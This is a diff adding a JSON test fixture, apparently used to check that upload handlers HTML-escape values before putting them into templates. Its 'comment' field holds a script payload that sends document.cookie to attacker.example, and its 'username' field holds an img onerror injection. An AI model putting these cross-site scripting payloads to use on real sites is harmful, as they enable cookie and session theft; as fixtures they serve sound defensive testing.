@@ -1,0 +1,7 @@
+{
+  "INERT_FIXTURE": "DO NOT RENDER RAW JSON VALUE AS UNESCAPED HTML",
+  "purpose": "tests that upload handlers HTML-encode JSON string values before inserting them into HTML templates",
+  "threat": "if the 'comment' field below is interpolated raw into a Blade/Twig/Vue template, the script tag executes",
+  "comment": "<script>document.cookie='stolen='+document.cookie;fetch('https://attacker.example/?c='+document.cookie)</script>",
+  "username": "\"><img src=x onerror=alert(1)>"
+}
